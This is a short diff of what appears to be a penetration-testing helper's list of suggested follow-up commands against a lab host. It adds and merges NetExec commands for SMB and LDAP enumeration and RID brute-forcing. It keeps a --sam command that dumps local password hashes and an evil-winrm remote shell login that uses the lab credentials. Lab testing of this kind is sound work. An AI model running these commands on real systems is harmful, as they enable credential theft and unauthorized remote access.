@@ -169,9 +169,11 @@ PASTABLES -- confirmed hits, suggested follow-up commands
 [192.168.59.203 | jason:lab]
 
 [SMB domain]
-  nxc smb 192.168.59.203 -u jason -p 'lab' --shares
-  nxc smb 192.168.59.203 -u jason -p 'lab' --rid-brute
+  nxc smb 192.168.59.203 -u jason -p 'lab' --users --shares --pass-pol --rid-brute 10000
   nxc smb 192.168.59.203 -u jason -p 'lab' --sam
+
+[LDAP]
+  nxc ldap 192.168.59.203 -u jason -p 'lab' --groups --computers
 
 [WINRM local]
   evil-winrm -i 192.168.59.203 -u jason -p 'lab'
